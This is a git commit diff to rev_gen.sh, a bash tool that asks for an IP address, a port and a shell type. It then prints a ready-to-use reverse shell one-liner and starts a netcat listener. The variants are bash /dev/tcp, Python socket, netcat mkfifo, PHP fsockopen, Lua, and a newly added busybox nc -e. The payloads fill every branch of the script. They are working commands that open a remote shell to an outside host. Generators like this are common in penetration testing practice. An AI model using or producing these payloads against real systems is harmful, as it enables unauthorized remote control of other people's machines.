9c8dcaf79b2ffc612a585cfe8cfaa3996b49540d
nokihera <minzarnihtut811@gmail.com>
2026-04-29 11:43:45 +0700

    rev_gen updated

--- rev_gen.sh
+++ rev_gen.sh
@@ -19,6 +19,7 @@ Please choose your reverse shell type!
 (3) Netcat
 (4) Php
 (5) Lua
+(6) Busybox
 EOF
 echo "Type in number for type:"
 read type
@@ -28,6 +29,7 @@ echo "Please type your listening port:"
 read port
 intro="***** REVERSE SHELL PAYLOAD *****"
 listener="***** LISTENER *****"
+
 if [[ $ip_address == "" || $port == "" ]]; then
   echo "You need to enter your ip address and port!"
   exit 1
@@ -35,39 +37,55 @@ fi
 if [[ $type == "1" ]]; then
 cat << EOF
 $intro
+
 bash -i >& /dev/tcp/$ip_address/$port 0>&1
+
 $listener
-nc -lvnp $port
 EOF
 elif [[ $type == "2" ]]; then
 cat << EOF
 $intro
+
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip_address",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+
 $listener
-nc -lvnp $port
 EOF
 elif [[ $type == "3" ]]; then
 cat << EOF
 $intro
+
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $ip_address $port >/tmp/f
+
 $listener
-nc -lvnp $port
 EOF
 elif [[ $type == "4" ]]; then
 cat << EOF
 $intro
+
 php -r '\$sock=fsockopen("$ip_address",$port);system("bash <&3 >&3 2>&3");'
+
 $listener
-nc -lvnp $port
 EOF
 elif [[ $type == "5" ]]; then
 cat << EOF
 $intro
+
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('$ip_address','$port');os.execute('bash -i <&3 >&3 2>&3');"
+
 $listener
-nc -lvnp $port
+EOF
+elif [[ $type == "6" ]]; then
+cat << EOF
+$intro
+
+busybox nc $ip_address $port -e bash
+
 EOF
 else
   echo "You need to choose a reverse shell type !!"
   exit 1
 fi
+echo ""
+echo "Press [Enter] to start listening on $port"
+read
+nc -lvnp $port
